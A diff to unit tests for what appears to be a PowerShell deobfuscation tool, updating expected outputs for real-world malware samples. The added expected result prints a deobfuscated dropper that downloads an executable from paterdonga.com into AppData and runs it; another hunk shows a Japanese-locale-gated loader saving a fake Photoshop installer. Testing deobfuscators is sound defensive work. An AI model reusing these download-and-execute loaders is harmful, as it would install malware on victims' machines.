@@ -46,7 +46,7 @@ class TestPs1RealWorldSmall(TestUnitBase):
         result = data | self.load() | str
         self.assertIn('Get-WmiObject', result)
         self.assertIn('-Class', result)
-        self.assertIn('Win32_processor', result)
+        self.assertIn('Win32_Processor', result)
 
     def test_foreach_with_external_variable(self):
         data = b"'65,66,67'.Split(',') | %{ [Char]([Int]$_ -bxor $key) }"
@@ -350,9 +350,18 @@ class TestPs1RealWorldLarge(TestUnitBase):
             r'''do^hi^YHNxSS<48B)q*1Rii7$nC6g>_BSH{Q`S#gdi|s)00G!4v}XVSQhC8?vBYQl0ssI200dcD'''
         ))
         test = data | self.load() | str
-        self.assertTrue(test.lower().startswith(
-            "if ((get-wmiobject win32_operatingsystem).osarchitecture -match 'ビ')"))
-        self.assertIn("'https:""/""/paterdonga"".com/uploads/HelpPaneS'", test)
+        goal = inspect.cleandoc(
+            r'''
+            if ((Get-WmiObject Win32_OperatingSystem).OsArchitecture -Match 'ビ') {
+              $zGK = "${env:AppData}\twaIn_32.exe"
+              Pop-Location
+              $4ai = (New-Object Net.WebClient)
+              ($4ai).DownloadFile('[[URL]]', $ZGk)
+              Start-Process $Zgk
+            }
+            '''
+        ).replace('[[URL]]', 'https:''//paterdonga''.com/uploads/HelpPaneS')
+        self.assertIn(goal, test)
 
     def test_real_world_stego_loader(self):
         data = (
@@ -533,7 +542,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
             $hb = (New-Object Net.WebClient)
             $sK = Get-Culture | Format-List -Property * | Out-String -Stream
             if ($SK -Match 'ja') {
-              $G7E = "${env:temp}\NGLClient_Photoshop120.0.5.exe"
+              $G7E = "${env:Temp}\NGLClient_Photoshop120.0.5.exe"
             } else {
               exit
             }
